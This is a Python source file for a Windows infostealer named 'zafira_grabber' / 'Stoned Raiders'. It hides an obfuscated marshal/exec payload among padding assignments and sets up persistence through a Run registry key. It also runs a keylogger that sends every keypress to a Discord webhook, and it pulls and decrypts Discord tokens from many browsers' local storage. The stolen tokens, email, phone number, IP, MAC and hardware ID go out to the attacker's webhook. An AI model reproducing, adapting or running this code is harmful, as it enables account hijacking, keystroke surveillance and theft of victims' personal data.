import ctypes
import json
import time 
import re
import threading
import socket
from pathlib import Path
from zipfile import ZipFile
import base64
import subprocess
import shutil
import uuid
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData
import requests
import os
import wmi 
import sys
import platform
from pynput.keyboard import Key, Listener
from datetime import date
from discord_webhook import DiscordWebhook, DiscordEmbed

__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__="__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__";__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__="__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__";from marshal import loads;exec(loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s(\x00\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01e\x02e\x00\xa0\x03e\x01\xa0\x03d\x02\xa1\x01\xa1\x01\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00NsX\x01\x00\x00\xfd7zXZ\x00\x00\x04\xe6\xd6\xb4F\x02\x00!\x01\x16\x00\x00\x00t/\xe5\xa3\x01\x01\x1ax\x9c\xed\x94]O\x830\x14\x86\xff\xcbn6.\xb0|\x0cV\xfc\x8a[\xb6\x0c\\\x14#\xd3\xcd\x85\xa4\x01Z\x81\xb0\xa5\xb3E\xd7\xf9\xeb\xa5F\x13\x82&^x\xc3\x05Mz\xfa\xbe'\xe7\xe2\xed\x93\xa6\x081\x92\xc6\x94sT\xad\xb6\xca\x8b^\x1bR\xfc){gmH\xd1\xd1\xech\xfeF\x93\x08\x92\x0c\xb64\xc2|\x10\xf7CA\xccPh\xda?\xb7^\xf7Wu\xc3\xab\x02\xeb\r,\xcb\xe6[\xe9\x81TJU\x8c\xf7cV\x96{~\n\x00\xceyB\x19>I\xe8\x0eD\xfb\x1c\x1cH\x9cQZp\xa0k\xb63\x1a\x0e-\xddqL\x03j\x96ni\xe0\x9ecf\xaa(\xe50\x15/\xb6\xb9\x89\xd6\xc2?\xc0\xd5\xf5\xf8q2\x8e\r;\x7fZ\xdf,\xa7\xae\x17L\xef\xde\x8e\xacp=\x07\xcei\xee\x99Kle\xc5\\U\x1f`0{\xbe\x95\x01t\x19*Fh5\x9b\xb8\xbe\xbf@(\x14\x91#\xd3\xb1\xe6\x05\x7f4B\x81\xa3\xea\x1c%\x14\xbf\x96\x84}Yx\xbe\xab\xfc\x96\\6\xc7%\x13\xa3A\xf0\x93Q_Q\xba\xc7\xde}\x1d-\x95\xbd\x0f-\xcf \xf0\x00\x00\x8f\xbe`\\$\x06U\xc5\x00\x01\xb3\x02\x9b\x02\x00\x00\xadT\x0eL\xb1\xc4g\xfb\x02\x00\x00\x00\x00\x04YZ)\x04\xda\x04zlib\xda\x04lzma\xda\x04exec\xda\ndecompress\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x07coduter\xda\x08<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x10\x00\x18\x01"));__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__="__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__";__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__="__regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss____regboss__";
__PING__ = "%ping_enabled%"
__PINGTYPE__ = "%ping_type%"

# = = = = = Startup = = = = = =
class Startup:
    def __init__(self) -> None:        
        self.working_dir = os.getenv("APPDATA") + "\\zafira_grabber"
    
        if self.check_self():
            return

        self.mkdir()
        self.write_stub()
        self.regedit()
    
    def check_self(self) -> bool:
        if os.path.realpath(sys.executable) == self.working_dir + "\\dat.txt":
            return True

        return False
    
    def mkdir(self) -> str:
        if not os.path.isdir(self.working_dir):
            os.mkdir(self.working_dir)
        
        else:
            shutil.rmtree(self.working_dir)
            os.mkdir(self.working_dir)
    
    def write_stub(self) -> None:
        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + "\\dat.txt")
        
        with open(file=f"{self.working_dir}\\run.bat", mode="w") as f:
            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")
    
    def regedit(self) -> None:
        subprocess.run(args=["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "zafira_grabber", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "zafira_grabber", "/t", "REG_SZ", "/d", f"{self.working_dir}\\run.bat", "/f"], shell=True)



   


# = = = = = Variables = = = = =









hostname = socket.gethostname()
ip_priv = socket.gethostbyname(hostname)
pcname = os.getenv('username')
hoy = date.today()

cpu = wmi.WMI().Win32_Processor()[0].Name
gpu = wmi.WMI().Win32_VideoController()[0].Name
ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
ip_publ = requests.get('https://api.ipify.org').text
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell = True, stdin = subprocess.PIPE, stderr = subprocess.PIPE).decode('utf-8').split('\n')[1].strip()


# = = = = = Keylogger = = = = =

def keyLogger():
  with Listener(on_press = onPress) as listener:
    listener.join()
  
# = = = = = On Press = = = = =

def onPress(key):
  webhook = DiscordWebhook(url = __WEBHOOK__, username = "Stoned Raiders", avatar_url = "https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg")
  embed = DiscordEmbed(title = "Stoned Raiders", description = "**¡Tecla Presionada!**", color = 0x00001)
  embed.add_embed_field(name = "**Tecla**", value = f"**`{str(key)}`**")
  embed.add_embed_field(name = "**Fecha**", value = f"**`{hoy}`**")
  embed.add_embed_field(name = "**Vicima**", value = f"**`{pcname}`**")
  embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg")
  embed.set_footer(text = "Made By Death Team | Scorpion", icon_url = "https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg")
  webhook.add_embed(embed)
  response = webhook.execute()



# = = = = = passwords = = = =






# = = = = = Token = = = = =



  
class grabtokens:
    def __init__(self) -> None:
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload()

    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [
                            x.strip() for x in open(
                                f'{path}\\{file_name}',
                                errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(
                                        base64.b64decode(
                                            y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(
                                            self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl,headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                        pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip() for x in open(
                            f'{path}\\{file_name}',
                            errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl,headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                    pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)


        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(
                    self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [
                        x.strip() for x in open(
                            f'{path}\\{_file}',
                            errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl,headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                    pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self):
        for token in self.tokens:
            val = ""
            val_name = ""

            r = requests.get(
                'https://discord.com/api/v9/users/@me',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token})

            discord_id = r.json()['id']
            username = r.json()['username'] + '#' + r.json()['discriminator']
            phone = r.json()['phone']
            email = r.json()['email']

            val_name += f'{username}'
            

 

            webhook = DiscordWebhook(url = __WEBHOOK__, username = "Stoned Raiders", avatar_url = "https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg")
            embed = DiscordEmbed(title = "Stoned Raiders", description = "**¡Nuevo Infectado!**", color = 0x00001)
            embed.add_embed_field(name = "**Nombre Del Computador**", value = f"**`{pcname}`**")
            embed.add_embed_field(name = "**GPU**", value = f"**`{gpu}`**")
            embed.add_embed_field(name = "**Dirección MAC**", value = f"**`{mac}`**", inline = True)
            embed.add_embed_field(name = "**CPU**", value = f"**`{cpu}`**")
            embed.add_embed_field(name = "**IP Pública**", value = f"**`{ip_publ}`**", inline = True)
            embed.add_embed_field(name = "**IP Privada**", value = f"**`{ip_priv}`**", inline = True)
            embed.add_embed_field(name = "**HWID**", value = f"**`{hwid}`**", inline = True)
            embed.add_embed_field(name = "**Memoria RAM**", value = f"**`{ram}`**")
            embed.add_embed_field(name = "**Token**", value = f"**`{token}`**")
            embed.add_embed_field(name = "**Email**", value = f"**`{email}`**")
            embed.add_embed_field(name = "**phone**", value = f"**`{phone}`**")
            embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg")
            embed.set_footer(text = "Made By Death Team | Scorpion", icon_url_url = "https://cdn.discordapp.com/attachments/1057095772535001129/1062526827979079690/Screenshot_20230104-031648_YouTube.jpg")
            webhook.add_embed(embed)
            webhook.execute()



   
    


  
